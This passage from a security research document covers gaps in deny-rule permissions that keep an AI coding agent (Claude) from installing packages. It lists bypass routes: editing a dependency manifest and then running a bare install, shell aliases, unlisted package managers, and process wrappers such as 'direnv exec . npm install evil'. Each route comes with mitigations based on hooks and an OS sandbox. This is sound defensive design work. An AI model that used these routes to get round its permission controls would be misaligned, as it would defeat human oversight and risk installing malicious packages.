**Mitigation**: Environment-level config (`.npmrc` `ignore-scripts=true`, `PIP_ONLY_BINARY=:all:`) applies regardless of how the install is invoked. PreToolUse hooks on Edit/Write tool can detect changes to Makefiles and build configuration.

### 5.5 Direct Manifest Editing

Claude can use the Edit or Write tool to add a dependency to `package.json`, `Cargo.toml`, `pyproject.toml`, etc., then run a bare install command (`npm install` with no package argument) that resolves from the modified manifest.

The deny rules for `Bash(npm install)` (no args) block this, but Claude could also run `npm ci` (if not denied), `yarn install`, or any lockfile-syncing command.

**Mitigation**: PreToolUse hooks on Edit/Write that detect changes to dependency manifests. PostToolUse hooks that compare lockfile hashes before and after install commands. `ask` rules on bare install commands.

### 5.6 Package Manager Aliases and Wrappers

Users or shell profiles may define aliases: `alias ni="npm install"`, `alias pi="pip install"`. If Claude discovers these aliases (e.g., by reading `.bashrc`), it could use them.

**Mitigation**: Deny rules cannot anticipate arbitrary aliases. PreToolUse hooks with broader regex patterns can catch some, but this is fundamentally a moving target. OS sandbox is the reliable backstop.

### 5.7 New and Emerging Package Managers

The deny list is a snapshot. New package managers (Deno, JSR, Gleam, etc.), new subcommands on existing managers, or renamed commands will not be caught until the deny list is updated.

**Mitigation**: The `ask` permission mode (default) prompts for any unrecognized Bash command. `dontAsk` mode denies anything not explicitly allowed. Both catch unknown package managers at the cost of more prompting/blocking.

### 5.8 Process Wrappers Not in the Strip List

Only `timeout`, `time`, `nice`, `nohup`, `stdbuf`, and bare `xargs` are stripped. Many process wrappers are NOT stripped:

```bash
direnv exec . npm install evil    # NOT stripped
devbox run npm install evil       # NOT stripped
mise exec -- npm install evil     # NOT stripped
docker exec node npm install evil # NOT stripped
```

Section 2 mitigates `env`, `command`, `sudo`, `bash -c`, and `sh -c` explicitly. But the list of possible wrappers is unbounded.

**Mitigation**: PreToolUse hooks with regex matching on the full command string. Deny rules for known environment runners: `Bash(direnv exec *npm install*)`, `Bash(devbox run *npm install*)`, etc. -- but this is an endless arms race. Hooks with LLM-based analysis (`prompt` hook type) can reason about unfamiliar wrappers.

### 5.9 The Fundamental Limitation

Deny rules match the **literal command string** that Claude submits to the Bash tool. They do not inspect:
- What the command does at runtime (subprocess spawning, dynamic evaluation)
- What environment variables expand to
- What shell aliases or functions resolve to
- What files the command reads or writes
- What network connections the command makes

This is why the defense-in-depth strategy requires all three layers:

1. **Deny rules** (this document): Fast, zero-latency blocking of obvious patterns. Catches ~80% of naive install attempts.
2. **PreToolUse hooks** (`hooks-research.md`): Programmatic enforcement with regex, API calls, and structured decisions. Catches ~95% including shell wrapping and env prefixes.
3. **OS sandbox** (`permissions-research.md` Section 8): Restricts filesystem access and network domains at the kernel level. Catches everything that reaches execution, regardless of how it was invoked.

---

## Sources

- `permissions-research.md` -- Rule syntax, glob semantics, evaluation order, process wrapper stripping, compound command handling, known bypasses (CVE-like 50-subcommand, v1.0.93 deny-rule failure)
- `hooks-research.md` -- PreToolUse mechanics, hook-permission interaction, bypass vectors, reference architecture
- `sibling-spike-cross-reference.md` -- Nix-specific dangerous commands (`nix-env -i`, `cachix use`), environment-level safety defaults, lockfile enforcement
